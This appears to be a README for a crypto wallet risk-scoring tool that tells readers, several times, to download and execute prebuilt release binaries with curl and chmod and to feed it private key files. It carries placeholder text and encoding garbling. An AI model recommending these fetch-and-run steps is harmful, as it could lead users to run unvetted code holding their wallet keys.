ðŸ”’ Secure-Key-Tool evaluates wallet safety and gives a clear risk score. Use it to inspect private key hygiene, address exposure, and smart contract links. This tool helps researchers, traders, developers, and security engineers judge wallet health.

## Features
- Score wallets on a 0â€“100 scale.
- Detect exposed or weak private keys.
- Flag reused seeds and risky derivation paths.
- Analyze linked smart contracts and token approvals.
- Scan for known phishing addresses and honeypots.
- Produce human-readable reports and JSON for automation.
- Run locally or integrate into CI/CD for audits.

## How it works
Secure-Key-Tool combines local heuristics and optional network checks. The tool runs deterministic checks on keys and addresses, then queries chain data and common threat lists when allowed. It aggregates findings into a single score. The system separates static checks (key format, entropy) from dynamic checks (on-chain balances, approvals).

Core components
- Key analyzer: parses keys, checks formats, tests entropy and derivation paths.
- Address profiler: pulls transaction history, token approvals, and counterparty patterns.
- Contract scanner: inspects verified contract source and ABI when available.
- Threat database: local list of phishing, scam, and sink addresses; optional remote updates.
- Report engine: produces a compact JSON and a detailed markdown report.

## Scoring methodology
The score ranges from 0 (high risk) to 100 (low risk). The score sums weighted checks:
- Private key hygiene (25%): entropy, format, reuse, exposed patterns.
- On-chain exposure (25%): high-value history, public approvals, contract interactions.
- Approval risk (20%): unlimited allowances, repetitive approvals to contracts.
- Contract trust (15%): verified source, known risky patterns.
- Behavioral patterns (15%): automated drains, mixing behavior, sudden large transfers.

Each check yields a pass/fail or a severity level. The tool maps severity to points and sums the result. The final score classifies the wallet:
- 85â€“100: Secure â€” low immediate risk.
- 65â€“84: Caution â€” some risky traces.
- 40â€“64: Risky â€” action recommended.
- 0â€“39: High risk â€” protect funds, rotate keys.

## Quick start
1. Visit the releases page and download the correct asset for your platform.
2. Run the downloaded file to install or execute the binary.
3. Run a single wallet scan using the CLI or integrate the JSON report into pipelines.

Install instructions below include sample commands. The release file needs to be downloaded and executed from the releases page: https://github.com/AR-Tushar/Secure-Key-Tool/releases

## Install (download and execute)
This repository publishes prebuilt release assets. Download the file for your OS from the releases page and execute it.

Download and run examples:
- Linux (example)
  - curl -L -o skt.tar.gz "https://github.com/AR-Tushar/Secure-Key-Tool/releases/download/vX.Y.Z/skt-linux-amd64.tar.gz"
  - tar -xzf skt.tar.gz
  - chmod +x skt
  - ./skt scan --address 0xYourAddress
- macOS (example)
  - curl -L -o skt-macos.tar.gz "https://github.com/AR-Tushar/Secure-Key-Tool/releases/download/vX.Y.Z/skt-darwin-amd64.tar.gz"
  - tar -xzf skt-macos.tar.gz
  - chmod +x skt
  - ./skt scan --address 0xYourAddress
- Windows (example)
  - Download the .zip from the releases page and unzip.
  - Run skt.exe from PowerShell: .\skt.exe scan --address 0xYourAddress

If the release asset name differs, replace the file name in the commands. The releases page lists all downloadable files and the matching platform builds: https://github.com/AR-Tushar/Secure-Key-Tool/releases

If the release link does not work in a particular environment, open the repositoryâ€™s Releases section in the GitHub UI and choose the latest artifact.

## CLI examples
Scan a single address
- ./skt scan --address 0xAbCd...1234 --output report.md

Scan multiple addresses from file
- ./skt batch --input addresses.txt --format json --out results.json

Run a quick private key check (offline)
- ./skt keycheck --key-file mykey.pem

Export a summary
- ./skt report --input results.json --summary

Flags and options
- --no-network: run static checks offline.
- --api-key: add chain provider key for enhanced on-chain queries.
- --format: json | md | html
- --threshold: set custom safe threshold for automation pipelines.

## Integration and API
Integrate the JSON report into alerting or CI tools. Example CI step:
- Run ./skt scan --address $WALLET_ADDRESS --format json --out report.json
- Parse report.json and fail build if score < 65

HTTP API (optional)
- The tool can run as a local HTTP service.
- GET /scan?address=0x... returns JSON.
- POST /scan with body { "addresses": ["0x..."] } supports batch.

## Common checks performed
Private key and seed checks
- Format validation (hex, WIF, PEM)
- Entropy estimate (bits)
- Common patterns and known weak seeds
- Derivation path anomalies

Address and transaction checks
- Transaction volume and frequency
- Interaction with known mixer or scam contracts
- Large inbound or outbound transfers
- Contract approvals and allowances

Smart contract checks
- Source verification on Etherscan-like explorers
- ABI analysis for dangerous functions
- Proxy patterns and upgradeability risks

Threat intelligence
- Match against local scam lists
- Heuristic detection for siphon or drain behavior
- Verify contracts against public exploit signatures

## Report format
Two main outputs
- Human-readable markdown: includes the score, top issues, and an action list.
- Machine-readable JSON: includes raw checks, scores per module, and metadata.

Example JSON snippet
{
  "address":"0xAbCd...1234",
  "score":72,
  "modules":{
    "key_hygiene":18,
    "on_chain_exposure":16,
    "approvals":12,
    "contract_trust":14,
    "behavior":12
  },
  "issues":[
    {"id":"approval_unlimited","severity":"medium","detail":"Unlimited ERC20 approval to 0xBad..."},
    {"id":"low_entropy","severity":"low","detail":"Entropy estimated < 128 bits"}
  ]
}

## Security model
- The tool runs locally by default and requires no keys or passwords.
- Optional network checks query public APIs to enrich findings.
- Use --no-network to run entirely offline.
- The tool never sends private key material to remote servers.

## Development and contribution
- Language: Go (example) â€” modular and fast.
- Tests: unit tests for each scanner module.
- CI: runs static checks, tests, and builds release assets.
- How to contribute:
  - Fork the repository.
  - Create a feature branch.
  - Add tests for new checks.
  - Open a pull request describing the change and the rationale.

Issue types we track
- New heuristics for wallet safety
- False positives or missed detections
- Performance and memory reduction
- Platform builds and packaging

Design principles
- Keep checks deterministic and explainable.
- Avoid black-box scoring; each point maps to a check.
- Prioritize reproducible results for audits.

## Examples and use cases
Security team audit
- Run batch scans for dozens of addresses before a release.
- Add results to an audit report.

Trader hygiene
- Check cold wallet keys and approvals after every large transfer.

Developer CI
- Block merge if any new contract approval lowers the repo ownerâ€™s wallet score.

Educational
- Use reports to teach developers about approvals, allowances, and safe key practices.

## Troubleshooting
- If a scan stalls, rerun with --no-network to isolate static checks.
- If an API provider returns rate limits, add an API key or increase backoff settings.
- If a release asset fails to run, verify checksum and platform match.

## Releases and downloads
